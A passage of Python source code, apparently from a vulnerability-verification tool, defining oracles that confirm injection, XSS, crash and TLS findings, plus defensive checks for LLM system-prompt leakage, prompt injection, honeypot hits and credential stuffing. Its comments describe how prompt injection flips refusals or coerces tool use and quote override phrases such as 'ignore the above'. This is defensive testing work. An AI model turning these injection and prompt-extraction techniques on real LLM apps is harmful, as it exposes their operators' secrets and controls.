         never be mistaken for an evaluation.

    Use a distinctive arithmetic result (a large product, not ``7*7=49``) so the
    expected value cannot coincidentally appear. A reflected-but-unevaluated
    payload, an encoded payload, or a benign page all correctly do NOT fire."""
    raw = (raw_expr or "").strip()
    expected = (expected_result or "").strip()
    body = _coerce_text(observed_body)

    if len(expected) < 2:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence="expected evaluation result too short to be a reliable marker",
            observed={"expected": expected})

    if expected not in body:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"evaluated result {expected!r} not present; expression was not evaluated",
            observed={"expected": expected, "raw_present": raw in body})

    if raw and raw in body:
        # The literal template text survived — reflection, not evaluation.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"raw expression {raw!r} reflected verbatim — reflected, not evaluated",
            observed={"expected": expected, "raw_present": True})

    if control_body is not None and expected in _coerce_text(control_body):
        # The "result" is just part of the page regardless of the payload.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"result {expected!r} also present in the benign control — not attributable to evaluation",
            observed={"expected": expected})

    idx = body.find(expected)
    snippet = body[max(0, idx - 24): idx + len(expected) + 24]
    return OracleSignal(
        kind=OracleKind.EVALUATION,
        fired=True,
        confidence=0.95,
        evidence=f"expression {raw!r} evaluated to {expected!r} server-side: ...{snippet}...",
        observed={"expected": expected, "raw": raw, "snippet": snippet},
    )


# ---------------------------------------------------------------------------
# 3d. AEGIS — the DEFENSIVE dual: prove-don't-guess oracles pointed inward at the
#     operator's OWN app. Same purity contract as every oracle above (pure,
#     deterministic, no wallclock/rng). They fire ONLY over retained evidence a
#     benign benchmark finding never carries, so `make gate` stays byte-identical.
# ---------------------------------------------------------------------------

# A planted canary must be a random, collision-resistant sentinel: long enough and
# high-entropy enough that a VERBATIM substring match cannot be coincidental and a
# natural-language phrase a user might legitimately paste cannot masquerade as it.
_MIN_CANARY_LEN = 16
_MIN_CANARY_ENTROPY_BITS_PER_CHAR = 2.5


def _shannon_bits_per_char(s: str) -> float:
    """Shannon entropy of ``s`` in bits/char (pure). A random base62/hex sentinel clears
    ~4-6; a repeated char ("aaaa…") is 0; an English phrase is ~1-2."""
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def system_prompt_disclosure_oracle(canary: str, llm_output: Any) -> OracleSignal:
    """Fire when a PLANTED high-entropy canary sentinel appears VERBATIM in the app's own
    LLM output — proof the secret LEAKED (system-prompt disclosure). The defensive dual of
    ``side_effect_oracle``: the operator plants a random sentinel in the system prompt out
    of band; if the model's response echoes it, the secret provably crossed the boundary.

    Honest scope (doctrine fix P2): this proves DISCLOSURE, not that an *injection* caused
    it — a benign "repeat your instructions" or the app's own debug path echoes the same
    sentinel. ``prompt_injection`` (control-vs-treatment behavior delta) is the separate,
    stronger oracle that earns the adversarial-cause label. The sentinel must be
    >= 16 chars AND >= 2.5 bits/char so a substring match cannot be coincidental."""
    sentinel = (canary or "").strip()
    haystack = llm_output if isinstance(llm_output, str) else _searchable(llm_output)
    if len(sentinel) < _MIN_CANARY_LEN:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence=f"canary too short (< {_MIN_CANARY_LEN} chars) to be collision-resistant",
            observed={"canary_len": len(sentinel)})
    if _shannon_bits_per_char(sentinel) < _MIN_CANARY_ENTROPY_BITS_PER_CHAR:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence="canary entropy too low — not a collision-resistant random sentinel",
            observed={"canary_len": len(sentinel)})
    idx = haystack.find(sentinel)
    if idx < 0:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence="planted canary not present in LLM output — no disclosure",
            observed={"canary_len": len(sentinel)})
    # Bounded, redacted human-readable span: reveal only a short window around the hit and
    # MASK the sentinel itself in the evidence string. (PR1: the retained oracle_context
    # still holds the verbatim sentinel + output so the certificate re-fires offline — the
    # reverify contract requires verbatim substrings; documented, not hashes-only.)
    start = max(0, idx - 16)
    end = min(len(haystack), idx + len(sentinel) + 16)
    redacted_span = haystack[start:idx] + "<canary>" + haystack[idx + len(sentinel):end]
    return OracleSignal(
        kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=True, confidence=0.95,
        evidence=f"planted canary disclosed in the app's LLM output: ...{redacted_span}...",
        observed={"offset": idx, "canary_len": len(sentinel), "redacted_span": redacted_span})


def _pi_behavior(obs: Any) -> dict[str, Any]:
    """Normalise one structurally-detectable LLM behavior observation to the three fields
    the control-vs-treatment delta compares. Total + deterministic."""
    if isinstance(obs, Mapping):
        tool = obs.get("tool")
        return {
            "tool": str(tool).strip().lower() if tool not in (None, "") else None,
            "refused": bool(obs.get("refused", False)),
            "boundary_token_echoed": bool(obs.get("boundary_token_echoed", False)),
        }
    return {"tool": None, "refused": False, "boundary_token_echoed": False}


def prompt_injection_oracle(pi_control: Any, pi_treatment: Any) -> OracleSignal:
    """Fire ONLY when an injected directive PROVABLY flipped a structurally-detectable
    behavior in the treatment turn vs a CLEAN control turn — the honest, strong proof of
    prompt injection (doctrine fix P2). Structurally the ``evaluation_oracle``'s control-
    vs-treatment discipline: the effect present in treatment, absent in the control that
    omits the attacker directive (everything else held fixed).

    It fires on a BEHAVIOR DELTA, never on structural-override markers alone (those stay
    LEADs — users legitimately paste "ignore the above"):
      1. refusal flipped — the clean control refused, the attacker turn complied;
      2. coerced tool — treatment selected a sensitive tool the clean control did not;
      3. boundary breakout — the model echoed the instruction/data boundary token only
         under the injected directive.
    Same retained (control, treatment) -> same verdict, re-runnable offline."""
    control = _pi_behavior(pi_control)
    treatment = _pi_behavior(pi_treatment)

    deltas: list[str] = []
    if control["refused"] and not treatment["refused"]:
        deltas.append("refusal flipped to compliance under the injected directive")
    if treatment["tool"] and treatment["tool"] != control["tool"]:
        deltas.append(f"injected directive coerced tool {treatment['tool']!r} the clean control did not select")
    if treatment["boundary_token_echoed"] and not control["boundary_token_echoed"]:
        deltas.append("instruction/data boundary token echoed only under the injected directive")

    if not deltas:
        return OracleSignal(
            kind=OracleKind.PROMPT_INJECTION, fired=False, confidence=0.0,
            evidence="no structurally-detectable behavior change vs the clean control — "
                     "markers alone do not confirm prompt injection",
            observed={"control": control, "treatment": treatment})
    return OracleSignal(
        kind=OracleKind.PROMPT_INJECTION, fired=True, confidence=0.9,
        evidence="prompt injection confirmed by a control-vs-treatment behavior delta: " + "; ".join(deltas),
        observed={"control": control, "treatment": treatment, "deltas": deltas})


def honeypot_hit_oracle(
    requested_path: Any, honeypot_paths: Any, crawler_allowlisted: bool = False
) -> OracleSignal:
    """Deterministic set-membership: fire (AUTOMATED_ACCESS) iff a client fetched a seeded
    honeypot resource no human UI links AND the client is not an allowlisted known-good
    crawler/monitor.

    Honest scope (doctrine fix P1): this proves AUTOMATED ACCESS — a non-interactive client
    fetched a resource no human UI renders — NOT "scraping". Link-unfurl bots, speculative
    prefetch, AV URL scanners, and uptime monitors also trip it; those are exactly what the
    operator allowlist REFUTES (``crawler_allowlisted=True`` -> a benign, non-firing signal).
    'Adversarial scraping' stays a LEAD unless independently corroborated."""
    path = _coerce_text(requested_path).strip()
    if isinstance(honeypot_paths, str):
        paths = {honeypot_paths.strip()}
    else:
        paths = {_coerce_text(p).strip() for p in (honeypot_paths or [])}

    if crawler_allowlisted:
        return OracleSignal(
            kind=OracleKind.AUTOMATED_ACCESS, fired=False, confidence=0.0,
            evidence="requester is an allowlisted known-good crawler/monitor — benign automation (REFUTES)",
            observed={"path": path, "allowlisted": True})
    if not path or path not in paths:
        return OracleSignal(
            kind=OracleKind.AUTOMATED_ACCESS, fired=False, confidence=0.0,
            evidence="requested path is not a seeded honeypot resource",
            observed={"path": path})
    return OracleSignal(
        kind=OracleKind.AUTOMATED_ACCESS, fired=True, confidence=0.95,
        evidence=f"automated access confirmed: honeypot resource {path!r} (no human UI links it) was fetched",
        observed={"path": path, "matched": True})


# --- credential stuffing / ATO (SPRT over unseen-(account, source) auth successes, Holm-controlled) ---

# The SPRT default is deliberately LESS trigger-happy than the boolean-blind SPRT: a returning
# user's first login from a new device is ONE unseen (account, source) success, so confirmation
# needs a RUN of unseen-pair successes — a breadth of compromised accounts from ONE source that a
# benign actor cannot produce. A source with only FAILED attempts produces ZERO SPRT rounds, so a
# NAT/CGNAT failed-only burst (the MECE benign twin) can never confirm — it stays a LEAD upstream.
_CREDSTUFF_ALPHA = 0.01          # per-family (per-source) SPRT type-I error
_CREDSTUFF_BETA = 0.01           # per-family SPRT type-II error
_CREDSTUFF_P1 = 0.8              # H1: unseen-pair-success rate of a stuffing source
_CREDSTUFF_P0 = 0.2              # H0: benign returning-user unseen-pair-success rate
_CREDSTUFF_FWER = 0.01           # family-wise error rate for the multi-identity Holm control
_CREDSTUFF_MAX_EVENTS = 20000    # bounded replay (DoS-safe: linear over a length-capped log)
_CREDSTUFF_EXACT_N = 400         # exact binomial tail up to this n; normal-approx (bounded) beyond


def _binomial_upper_tail(k: int, n: int, p: float) -> float:
    """P(X >= k) for X ~ Binomial(n, p) — the per-family p-value under H0 (unseen-pair successes
    arise only at the benign rate ``p``). Exact stdlib integer binomials for small n; a bounded,
    continuity-corrected normal approximation beyond ``_CREDSTUFF_EXACT_N`` so the computation
    stays cheap and deterministic on a large (but SPRT-decided, hence realistically small) n."""
    if n <= 0 or k <= 0:
        return 1.0
    if k > n:
        return 0.0
    p = min(1.0, max(0.0, p))
    if p <= 0.0:
        return 0.0
    if p >= 1.0:
        return 1.0
    if n <= _CREDSTUFF_EXACT_N:
        tail = sum(math.comb(n, i) * (p ** i) * ((1.0 - p) ** (n - i)) for i in range(k, n + 1))
        return min(1.0, tail)
    mu = n * p
    sigma = math.sqrt(n * p * (1.0 - p))
    if sigma <= 0.0:
        return 1.0 if k <= mu else 0.0
    z = (k - 0.5 - mu) / sigma
    return max(0.0, min(1.0, 1.0 - _normal_cdf(z)))


def credential_stuffing_oracle(
    auth_events: Any,
    *,
    alpha: float = _CREDSTUFF_ALPHA,
    beta: float = _CREDSTUFF_BETA,
    p1: float = _CREDSTUFF_P1,
    p0: float = _CREDSTUFF_P0,
    fwer: float = _CREDSTUFF_FWER,
    benign_sources: Any = None,
) -> OracleSignal:
    """Confirm a credential-stuffing / account-takeover CAMPAIGN by the SAME Wald SPRT
    ``boolean_inference_oracle`` uses (``_sprt_decision``), run over each source's stream of
    UNSEEN-``(account, source)`` auth SUCCESS outcomes, with a Holm-Bonferroni family-wise
    correction across the distinct source identities.

    ``auth_events`` is an ORDERED list of ``{"account", "source", "success"}``. Identifiers are
    already keyed-HMAC pseudonyms (the oracle NEVER sees a raw username/IP). The oracle REPLAYS
    the log deterministically — no wallclock, no rng, bounded to ``_CREDSTUFF_MAX_EVENTS``:

      * Per source, a SUCCESS on an ``(account, source)`` pair not previously seen succeeding is
        the attacker-signature Bernoulli signal (1); a repeat success on an already-owned pair is
        a returning-user control (0). FAILURES produce NO SPRT round — so a failed-only burst (the
        MECE benign twin: NAT/CGNAT bulk) yields zero rounds and can NEVER confirm here.
      * The per-source SPRT CONFIRMS only when the log-likelihood ratio crosses ``log((1-beta)/
        alpha)`` — one new-device login cannot cross it; a run of successes across many unseen
        accounts does. A binomial upper-tail p-value under H0 is derived from the consumed counts.
      * Across the distinct sources (the multiple identities probed at once), ``holm_correction``
        controls the FAMILY-WISE false-positive rate: a source is CONFIRMED only when its SPRT
        crossed AND it survives the family-wise correction at ``fwer`` — so monitoring thousands
        of sources cannot manufacture a confirmation by multiplicity (a marginal single-source
        SPRT hit that fails the family-wise control is honestly withheld).

    ``benign_sources`` (optional) is an operator allowlist of known-good egress identities
    (a documented NAT/CGNAT, an SSO gateway) whose successes REFUTE — they can never confirm,
    mirroring the honeypot crawler allowlist (P1). Pure + deterministic."""
    events = list(auth_events or [])[:_CREDSTUFF_MAX_EVENTS]
    allow = {_coerce_text(s).strip() for s in (benign_sources or [])}

    # group per source in arrival order (deterministic; a dict preserves insertion order).
    by_source: dict[str, list[tuple[str, bool]]] = {}
    order: list[str] = []
    for ev in events:
        if not isinstance(ev, Mapping):
            continue
        source = _coerce_text(ev.get("source")).strip()
        account = _coerce_text(ev.get("account")).strip()
        if not source or not account:
            continue
        if source not in by_source:
            by_source[source] = []
            order.append(source)
        by_source[source].append((account, bool(ev.get("success", False))))

    families: list[dict[str, Any]] = []
    for source in order:
        rows = by_source[source]
        allowlisted = source in allow

        # (a) The SEQUENTIAL decision: the SAME Wald SPRT boolean_inference uses, over the
        #     unseen-(account, source) SUCCESS indicator stream — it stops early at the first
        #     boundary. FAILURES never yield a round (a failed-only burst never crosses).
        seen_sprt: set[str] = set()

        def _sig_seq(_rows=rows, _seen=seen_sprt):
            for account, success in _rows:
                if not success:
                    continue
                unseen = account not in _seen
                _seen.add(account)
                yield unseen

        decided, llr, _n_used, _n_signal, upper, lower = _sprt_decision(
            _sig_seq(), alpha=alpha, beta=beta, p1=p1, p0=p0)

        # (b) The FAMILY-WISE evidence: a FIXED-sample binomial upper-tail p-value over the WHOLE
        #     window (NOT the SPRT-truncated prefix) — so evidence STRENGTH scales with the breadth
        #     of compromise (a 6-account run is stronger than a 4-account run even though the SPRT
        #     halts at the same boundary). This is what Holm ranks across identities.
        seen_full: set[str] = set()
        n_success = 0
        n_unseen = 0
        for account, success in rows:
            if not success:
                continue
            n_success += 1
            if account not in seen_full:
                n_unseen += 1
                seen_full.add(account)
        pval = 1.0 if allowlisted else _binomial_upper_tail(n_unseen, n_success, p0)

        families.append({
            "source": source, "decided": "allowlisted" if allowlisted else (decided or "inconclusive"),
            "llr": round(llr, 4), "n_success": n_success, "n_unseen": n_unseen,
            "distinct_accounts": len(seen_full), "p_value": pval,
        })

    # Holm-Bonferroni across the distinct source identities (the multi-identity family-wise
    # control). A source confirms iff its SPRT crossed AND Holm rejects its p-value at `fwer`.
    pvals = [f["p_value"] for f in families]
    rejects = holm_correction(pvals, alpha=fwer) if pvals else []
    confirmed = [
        f for f, rej in zip(families, rejects)
        if f["decided"] == "confirm" and rej
    ]

    observed = {"families": families, "confirmed_sources": [f["source"] for f in confirmed],
                "n_families": len(families), "fwer": fwer}
    if not confirmed:
        # honest non-fire: name why (no SPRT crossing, or family-wise control withheld it).
        crossed = [f for f in families if f["decided"] == "confirm"]
        if crossed:
            why = (f"{len(crossed)} source(s) crossed the SPRT but did NOT survive the Holm "
                   f"family-wise control at fwer={fwer} over {len(families)} identities")
        else:
            why = "no source's unseen-pair successes crossed the SPRT boundary (failed-only / benign)"
        return OracleSignal(
            kind=OracleKind.CREDENTIAL_STUFFING, fired=False, confidence=0.0,
            evidence=f"no credential stuffing confirmed: {why}", observed=observed)

    confidence = min(0.99, 1.0 - fwer)
    detail = "; ".join(
        f"source {f['source']!r}: {f['n_unseen']} unseen-account successes over "
        f"{f['distinct_accounts']} accounts (LLR={f['llr']:.2f}, p={f['p_value']:.2g})"
        for f in confirmed)
    return OracleSignal(
        kind=OracleKind.CREDENTIAL_STUFFING, fired=True, confidence=confidence,
        evidence=(f"credential stuffing / ATO confirmed for {len(confirmed)} source identity(ies) "
                  f"(SPRT crossed + Holm family-wise control at fwer={fwer}): {detail}"),
        observed=observed)


# ---------------------------------------------------------------------------
# 4. Sanitizer signal — crash/UB oracles in captured process output
# ---------------------------------------------------------------------------


# (regex, label, confidence). Ordered by strength; the strongest match wins.
_SANITIZER_PATTERNS: list[tuple[re.Pattern[str], str, float]] = [
    (re.compile(r"ERROR:\s*AddressSanitizer"), "asan", 0.95),
    (re.compile(r"AddressSanitizer:\s*(DEADLYSIGNAL|SEGV|heap-|stack-|global-)"), "asan", 0.95),
    (re.compile(r"(heap|stack|global)-buffer-overflow"), "asan", 0.9),
    (re.compile(r"heap-use-after-free|use-after-free"), "asan", 0.92),
    (re.compile(r"WARNING:\s*MemorySanitizer"), "msan", 0.9),
    (re.compile(r"WARNING:\s*ThreadSanitizer|data race"), "tsan", 0.88),
    (re.compile(r"runtime error:.*(overflow|out of bounds|null pointer|misaligned)"), "ubsan", 0.85),
    (re.compile(r"UndefinedBehaviorSanitizer"), "ubsan", 0.85),
    (re.compile(r"LeakSanitizer|detected memory leaks"), "lsan", 0.75),
    (re.compile(r"\*\*\* stack smashing detected \*\*\*"), "stack-protector", 0.9),
    (re.compile(r"double free or corruption|malloc\(\): |free\(\): "), "glibc-abort", 0.85),
    (re.compile(r"thread '.*' panicked at"), "rust-panic", 0.85),
    (re.compile(r"^panic:", re.MULTILINE), "go-panic", 0.8),
    (re.compile(r"Segmentation fault|SIGSEGV|SIGABRT|core dumped"), "signal", 0.8),
    (re.compile(r"Traceback \(most recent call last\):"), "py-traceback", 0.65),
]


def sanitizer_signal_oracle(process_output: Any) -> OracleSignal:
    """Scan captured stdout/stderr for sanitizer, panic, abort and traceback
    markers. A single unambiguous crash marker fires; a bare Python traceback
    fires only at moderate confidence (it can be an ordinary handled error)."""
    text = _coerce_text(process_output)
    matches: list[dict[str, Any]] = []
    for pattern, label, conf in _SANITIZER_PATTERNS:
        m = pattern.search(text)
        if m:
            line = _line_of(text, m.start())
            matches.append({"label": label, "confidence": conf,
                            "match": m.group(0), "line": line})

    if not matches:
        return OracleSignal(
            kind=OracleKind.SANITIZER_SIGNAL, fired=False, confidence=0.0,
            evidence="no sanitizer/crash/panic marker in output", observed={})

    best = max(matches, key=lambda x: x["confidence"])
    return OracleSignal(
        kind=OracleKind.SANITIZER_SIGNAL,
        fired=True,
        confidence=best["confidence"],
        evidence=f"{best['label']} marker: {best['line'].strip()[:200]}",
        observed={"matches": matches, "best": best["label"]},
    )


def _line_of(text: str, offset: int) -> str:
    start = text.rfind("\n", 0, offset) + 1
    end = text.find("\n", offset)
    return text[start: end if end >= 0 else len(text)]


# ---------------------------------------------------------------------------
# 3d. DOM execution — injected JS actually ran in a real DOM (DOM-XSS)
# ---------------------------------------------------------------------------


def dom_execution_oracle(binding_calls: Any, canary: str) -> OracleSignal:
    """Fire when a unique canary appears among the arguments the page passed to a
    CDP binding — proof that injected JavaScript **executed** in a real browser
    DOM, not merely that a marker was reflected.

    This is the strongest possible XSS evidence and is near-unforgeable: the
    binding is a function only the driver registered (Runtime.addBinding), and the
    only way its call carrying the canary appears is if the injected script ran and
    invoked it. A reflected-but-inert payload, an encoded payload, or a page that
    never executes the sink all produce no binding call and correctly do not fire.
    The canary must be non-trivial so an incidental value cannot masquerade as one."""
    canary = (canary or "").strip()
    calls = [_coerce_text(c) for c in (binding_calls or [])]

    if len(canary) < 6:
        return OracleSignal(
            kind=OracleKind.DOM_EXECUTION, fired=False, confidence=0.0,
            evidence="execution canary too short to be a reliable, unforgeable marker",
            observed={"canary": canary})

    hit = next((c for c in calls if canary in c), None)
    if hit is None:
        return OracleSignal(
            kind=OracleKind.DOM_EXECUTION, fired=False, confidence=0.0,
            evidence="no binding call carried the execution canary; injected script did not run",
            observed={"canary": canary, "call_count": len(calls)})

    return OracleSignal(
        kind=OracleKind.DOM_EXECUTION,
        fired=True,
        confidence=0.97,
        evidence=f"injected script executed in the DOM and invoked the callback with {canary!r}",
        observed={"canary": canary, "call": hit[:200]},
    )


# ---------------------------------------------------------------------------
# 4b. Error signature — a datastore/parser error a payload provoked (error-based)
# ---------------------------------------------------------------------------


# (regex, engine, confidence). Distinctive server-side error strings that only a
# malformed query/expression provokes — the signature of error-based injection.
# Ordered strongest-first; the strongest match wins.
_ERROR_SIGNATURES: list[tuple[re.Pattern[str], str, float]] = [
    # --- SQL: MySQL / MariaDB ---
    (re.compile(r"You have an error in your SQL syntax", re.I), "mysql", 0.95),
    (re.compile(r"check the manual that corresponds to your (MySQL|MariaDB) server version", re.I), "mysql", 0.95),
    (re.compile(r"\bwarning:\s*mysqli?_", re.I), "mysql", 0.85),
    (re.compile(r"MySQLSyntaxErrorException|com\.mysql\.jdbc", re.I), "mysql", 0.9),
    (re.compile(r"valid MySQL result|Unknown column '[^']+' in 'field list'", re.I), "mysql", 0.85),
    # --- SQL: PostgreSQL ---
    (re.compile(r"PostgreSQL.*ERROR|PG::(Syntax|Undefined)|pg_query\(\)|org\.postgresql", re.I), "postgresql", 0.95),
    (re.compile(r"unterminated quoted string at or near|syntax error at or near", re.I), "postgresql", 0.9),
    # --- SQL: MSSQL ---
    (re.compile(r"Unclosed quotation mark after the character string", re.I), "mssql", 0.95),
    (re.compile(r"Microsoft SQL (Server|Native Client)|System\.Data\.SqlClient\.SqlException", re.I), "mssql", 0.92),
    (re.compile(r"Incorrect syntax near|\[SQL Server\]", re.I), "mssql", 0.9),
    # --- SQL: Oracle ---
    (re.compile(r"\bORA-\d{5}\b", re.I), "oracle", 0.95),
    (re.compile(r"Oracle.*(Driver|Database)|quoted string not properly terminated", re.I), "oracle", 0.9),
    # --- SQL: SQLite ---
    (re.compile(r"SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite|sqlite3\.OperationalError", re.I), "sqlite", 0.92),
    (re.compile(r"unrecognized token:|SQL logic error|near \"[^\"]*\": syntax error", re.I), "sqlite", 0.88),
    # --- SQL: generic JDBC/ODBC ---
    (re.compile(r"java\.sql\.SQLException|SQLSTATE\[|ODBC.*Driver.*error", re.I), "sql-generic", 0.8),
    # --- NoSQL ---
    (re.compile(r"MongoError|E11000 duplicate key|BSONError|com\.mongodb", re.I), "mongodb", 0.85),
    # --- LDAP ---
    (re.compile(r"javax\.naming\.directory|LDAPException|Invalid DN syntax|com\.sun\.jndi\.ldap", re.I), "ldap", 0.82),
    # --- XPath ---
    (re.compile(r"XPathException|MS\.Internal\.Xml|Expression must evaluate to a node-set|xmlXPathEval", re.I), "xpath", 0.82),
]


def error_signature_oracle(observed_body: Any, control_body: Any = None) -> OracleSignal:
    """Fire when a response contains a distinctive **datastore/parser error** that
    a malformed injection payload provoked — the signature of error-based injection
    (SQL/NoSQL/LDAP/XPath).

    Two guards keep it precise: the error string must be a known, engine-specific
    signature (not a generic "error" word), AND — when a benign ``control_body`` is
    supplied — the SAME signature must be ABSENT from the control, so a page that
    always shows a stack trace cannot be mistaken for an injection. This is the
    error-based analogue of the sanitizer oracle: a real backend error is strong,
    attributable evidence the input reached and broke the query parser."""
    body = _coerce_text(observed_body)
    control = _coerce_text(control_body) if control_body is not None else ""

    for pattern, engine, conf in _ERROR_SIGNATURES:
        m = pattern.search(body)
        if not m:
            continue
        if control and pattern.search(control):
            # the same error is present without the payload -> not attributable
            continue
        line = _line_of(body, m.start())
        return OracleSignal(
            kind=OracleKind.ERROR_SIGNATURE,
            fired=True,
            confidence=conf,
            evidence=f"{engine} error provoked by the payload: {line.strip()[:200]}",
            observed={"engine": engine, "match": m.group(0)[:200]},
        )

    return OracleSignal(
        kind=OracleKind.ERROR_SIGNATURE, fired=False, confidence=0.0,
        evidence="no datastore/parser error signature in the response",
        observed={})


# ---------------------------------------------------------------------------
# 5. Out-of-band callback — inbound interaction against a unique token
# ---------------------------------------------------------------------------


def oob_callback_oracle(hits: Any) -> OracleSignal:
    """Fire when the out-of-band receiver logged >=1 inbound interaction
    against a correlation token. An inbound hit on a per-finding unique token
    is close to unforgeable evidence of blind execution (SSRF, OOB SQLi,
    blind XXE, deserialization callbacks). `hits` is whatever `oob.poll()`
    returned — a list of hit records/objects."""
    hit_list = list(hits or [])
    if not hit_list:
        return OracleSignal(
            kind=OracleKind.OOB_CALLBACK, fired=False, confidence=0.0,
            evidence="no out-of-band interaction observed", observed={"hit_count": 0})

    first = hit_list[0]
    summary = _hit_summary(first)
    return OracleSignal(
        kind=OracleKind.OOB_CALLBACK,
        fired=True,
        confidence=0.95,
        evidence=f"{len(hit_list)} out-of-band interaction(s); first: {summary}",
        observed={"hit_count": len(hit_list), "first": summary},
    )


def _hit_summary(hit: Any) -> str:
    if isinstance(hit, Mapping):
        return f"{hit.get('method', '?')} {hit.get('path', '?')} from {hit.get('client_ip', '?')}"
    method = getattr(hit, "method", "?")
    path = getattr(hit, "path", "?")
    client = getattr(hit, "client_ip", "?")
    return f"{method} {path} from {client}"


# ---------------------------------------------------------------------------
# Service reachability — a real transport handshake reproduced (port open)
# ---------------------------------------------------------------------------


def service_reachability_oracle(observed_handshake: Any) -> OracleSignal:
    """Fire when a REAL transport handshake to a service reproduced — a completed TCP connect to the
    claimed host:port (optionally corroborated by a service banner the endpoint sent). This is what
    promotes a scanner's "open 443" OBSERVATION (Nmap et al.) into a reachability FACT: the port is
    open iff a live handshake actually connected, judged here over the RETAINED connect evidence —
    pure, deterministic, and re-runnable offline, so a scanner's say-so alone never confirms.

    ``observed_handshake`` is the JSON-safe evidence a reachability probe captured::

        {"connected": bool, "host": str, "port": int, "protocol": "tcp"|"udp",
         "peer": "ip:port"?, "banner": str?, "error": str?}

    Fires only when ``connected is True`` AND the evidence names the concrete host+port the connect
    resolved to. A completed TCP three-way handshake IS the proof of reachability, so a bare connect
    confirms at 0.90; a captured service BANNER — raw application-layer bytes the endpoint actually
    sent, a genuine re-derivable artifact — raises it to 0.97. (The captured ``peer`` is retained for
    the audit trail but does NOT raise confidence: ``getpeername`` returns the very port we dialled,
    so a "peer port matches" check is self-referential and would over-state a bare connect.) A refused
    / timed-out / UDP-without-a-banner / malformed handshake does not fire — an absent or negative
    signal is never an assumed pass.

    GROUNDING is procedural, exactly as for every oracle: the handshake MUST originate from a real
    gated capture (``verify.reachability.capture_handshake``), never a scanner's parsed "open" row —
    that is what keeps this a re-verification rather than a rubber-stamp of the scanner's say-so."""
    if not isinstance(observed_handshake, Mapping):
        return OracleSignal(kind=OracleKind.SERVICE_REACHABILITY, fired=False, confidence=0.0,
                            evidence="no handshake evidence")
    hs = observed_handshake
    connected = hs.get("connected")
    host = _coerce_text(hs.get("host")).strip()
    protocol = (_coerce_text(hs.get("protocol")).strip().lower() or "tcp")
    try:
        port_i = int(hs["port"]) if hs.get("port") is not None else None
    except (TypeError, ValueError, KeyError):
        port_i = None

    if connected is not True or not host or port_i is None:
        reason = _coerce_text(hs.get("error")).strip() or "no completed handshake to a concrete host:port"
        return OracleSignal(
            kind=OracleKind.SERVICE_REACHABILITY, fired=False, confidence=0.0,
            evidence=f"not reachable: {reason}",
            observed={"host": host, "port": port_i, "connected": connected})

    banner = _coerce_text(hs.get("banner")).strip()
    peer = _coerce_text(hs.get("peer")).strip()
    # UDP has no connection handshake — only an application-layer response proves reachability.
    if protocol == "udp" and not banner:
        return OracleSignal(
            kind=OracleKind.SERVICE_REACHABILITY, fired=False, confidence=0.0,
            evidence="udp reachability needs a service response (no banner)",
            observed={"host": host, "port": port_i, "protocol": protocol})

    # Only a real service banner corroborates beyond the bare handshake — the captured peer port is
    # definitionally the one we dialled, so it carries no independent signal.
    confidence = 0.97 if banner else 0.90
    detail = f"banner {banner[:48]!r}" if banner else (f"peer {peer}" if peer else "tcp connect")
    return OracleSignal(
        kind=OracleKind.SERVICE_REACHABILITY, fired=True, confidence=confidence,
        evidence=f"{protocol} handshake reproduced to {host}:{port_i} ({detail})",
        observed={"host": host, "port": port_i, "protocol": protocol,
                  "peer": peer, "banner": banner[:96]})


# ---------------------------------------------------------------------------
# TLS weakness — a real handshake negotiated a deprecated protocol / weak cipher
# ---------------------------------------------------------------------------

# Protocols no client should still negotiate (uppercased ``ssl.SSLSocket.version()`` strings).
_DEPRECATED_TLS_VERSIONS = frozenset({"SSLV2", "SSLV3", "TLSV1", "TLSV1.1"})

# Broken cipher-suite tokens (uppercased). Each names a construction with a known, practical weakness
# (a keystream / key-size / hash / authentication break), so a suite carrying it is weak whatever the
# protocol version.
_WEAK_CIPHER_TOKENS: tuple[tuple[str, str], ...] = (
    ("RC4", "RC4 keystream biases"),
    ("RC2", "RC2 is broken"),
    ("3DES", "3DES/Sweet32 (64-bit block)"),
    ("DES-CBC3", "3DES/Sweet32 (64-bit block)"),
    ("DES-CBC", "single-DES 56-bit key"),
    ("EXPORT", "export-grade (deliberately weakened) crypto"),
    ("EXP-", "export-grade (deliberately weakened) crypto"),
    ("NULL", "NULL cipher — no encryption"),
    ("ADH", "anonymous DH — no authentication"),
    ("AECDH", "anonymous ECDH — no authentication"),
    ("ANON", "anonymous key exchange — no authentication"),
    ("MD5", "MD5 MAC is broken"),
    ("IDEA", "IDEA is deprecated"),
    ("SEED", "SEED is deprecated"),
)


def tls_weakness_oracle(observed_tls: Any) -> OracleSignal:
    """Fire when a REAL TLS handshake negotiated a DEPRECATED protocol or a WEAK cipher suite — the
    server actually agreed to it, so it is a re-verifiable FACT about the endpoint's crypto posture,
    not a config guess. Judges the retained handshake (``verify.tls.capture_tls_handshake`` captured it
    over a live connection); a strong TLS1.2/1.3 handshake with a modern suite does NOT fire (good
    posture is not a finding), and an absent/failed handshake does not fire.

    ``observed_tls`` is JSON-safe evidence::

        {"connected": bool, "host": str, "port": int, "tls_version": "TLSv1"|"TLSv1.2"|...,
         "cipher": "ECDHE-RSA-AES128-GCM-SHA256"|..., "cipher_bits": int?, "error": str?}

    A deprecated protocol confirms at 0.95; a weak cipher at 0.92. Pure and deterministic, so the same
    verdict re-verifies offline from the retained context — an absent signal is never an assumed pass."""
    if not isinstance(observed_tls, Mapping):
        return OracleSignal(kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
                            evidence="no tls handshake evidence")
    tls = observed_tls
    if tls.get("connected") is not True:
        return OracleSignal(
            kind=OracleKind.TLS_WEAKNESS, fired=False, confidence=0.0,
            evidence=f"no completed tls handshake: {_coerce_text(tls.get('error')).strip() or 'not connected'}")
